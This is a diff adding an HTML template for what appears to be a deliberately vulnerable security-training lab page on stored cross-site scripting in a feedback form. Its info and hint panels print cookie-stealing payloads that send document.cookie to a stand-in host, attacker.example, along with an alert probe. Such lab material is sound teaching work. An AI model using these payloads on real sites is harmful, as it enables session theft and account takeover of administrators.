@@ -1,0 +1,50 @@
+{% extends 'base.html' %}
+{% block title %}Feedback — Stored XSS{% endblock %}
+{% block content %}
+<div class="panel">
+  <div class="panel-head">
+    <span class="badge p2">P2</span>
+    <h2>Crew Feedback — Stored XSS</h2>
+    <div><span class="mono-dim">CWE-79 · User input rendered with |safe in admin view · Persistent script injection</span></div>
+  </div>
+  <div class="vuln-info">
+    Feedback is stored in the DB and rendered in the admin panel with the Jinja2 <code>|safe</code>
+    filter — bypassing auto-escaping. An attacker submitting
+    <code>&lt;script&gt;document.location='https://attacker.example/?c='+document.cookie&lt;/script&gt;</code>
+    executes it in every admin browser that views the feedback list.
+  </div>
+  <div class="hint-box">
+    <b>Payloads:</b>
+    <ul>
+      <li><code>&lt;script&gt;alert('XSS-'+document.domain)&lt;/script&gt;</code></li>
+      <li><code>&lt;img src=x onerror="fetch('https://attacker.example/'+btoa(document.cookie))"&gt;</code></li>
+      <li><code>&lt;svg onload="navigator.sendBeacon('https://attacker.example',document.cookie)"&gt;</code></li>
+    </ul>
+    Then visit <a href="{{ url_for('feedback') }}">/admin/feedback</a> to trigger stored XSS.
+  </div>
+</div>
+{% with messages = get_flashed_messages(with_categories=true) %}
+  {% if messages %}{% for cat,msg in messages %}<div class="flash {{ cat }}">{{ msg }}</div>{% endfor %}{% endif %}
+{% endwith %}
+{% if feedbacks %}
+<div class="panel">
+  <h2>Recent Submissions</h2>
+  <table class="data-table">
+    <tr><th>ID</th><th>Name</th><th>Feedback (escaped here)</th><th>Rating</th></tr>
+    {% for fb in feedbacks %}
+    <tr><td>{{ fb.id }}</td><td>{{ fb.name }}</td><td>{{ fb.message[:60] | e }}</td>
+        <td>{{ '★' * fb.rating | default(3) }}</td></tr>
+    {% endfor %}
+  </table>
+</div>
+{% endif %}
+<div class="panel">
+  <form method="POST" class="lab-form">
+    <label>Name</label>
+    <input type="text" name="name" placeholder="Your name" class="input-field">
+    <label>Feedback (try XSS payloads)</label>
+    <textarea name="message" rows="5" class="code-input" placeholder="&lt;script&gt;alert(1)&lt;/script&gt;"></textarea>
+    <button class="btn" type="submit">Submit Feedback</button>
+  </form>
+</div>
+{% endblock %}
